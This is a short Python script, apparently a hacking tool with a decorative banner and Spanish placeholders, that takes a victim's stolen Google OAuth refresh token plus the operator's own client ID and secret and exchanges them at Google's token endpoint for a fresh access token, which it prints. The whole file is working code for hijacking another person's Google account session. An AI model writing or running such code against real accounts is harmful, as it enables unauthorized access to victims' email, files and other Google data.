from colorama import init, Fore

def print_ascii_banner():
    banner = """
  _   ___      ___ __   _ ___ _  __   __      ___ _       ___       __  
 / _  )_  )\ ) )_  )_) /_) ) / ) )_) (_ `      ) / ) )_/  )_  )\ ) (_ ` 
(__/ (__ (  ( (__ / \ / / ( (_/ / \ .__)      ( (_/ /  ) (__ (  ( .__)  
                                                                        
  _   _     ___      _    _                                             
 / ) /_) / / ) )_)    )  (.\                                            
(_/ / / (_/ ( ( (    /_ o \_)                                           
                                                                        
  _    _   _   _       ___                                              
 / _  / ) / ) / _  )   )_                                               
(__/ (_/ (_/ (__/ (__ (__                                               

🄱 🅈 : 🄰 🄻 🄴 🅇 🄸 🅂 🄻 🅉 🄻 = 🄼 🄰 🅂 🄰 🄲 🅁 🄴 🄰 2
                                                                                                        
    """
    print(Fore.BLUE + banner)


from google.oauth2.credentials import Credentials
from google.auth.transport.requests import Request
from google.auth.exceptions import RefreshError


print_ascii_banner()


refresh_token = "INGRESA EL TOKEN REFRESH DE LA VICTIMA"


credentials = Credentials(
    None,
    refresh_token=refresh_token,
    token_uri="https://oauth2.googleapis.com/token",
    client_id="TU CLIENTE ID DE LA APLICACION WEB ",
    client_secret="TU CLIENTE  SECRETO DE LA APLICACION WEB"
)


try:
    credentials.refresh(Request())


    access_token = credentials.token

    print("Token de acceso actualizado:")
    print(access_token)

except RefreshError as e:
    print("Error al refrescar el token:")
    print(e)
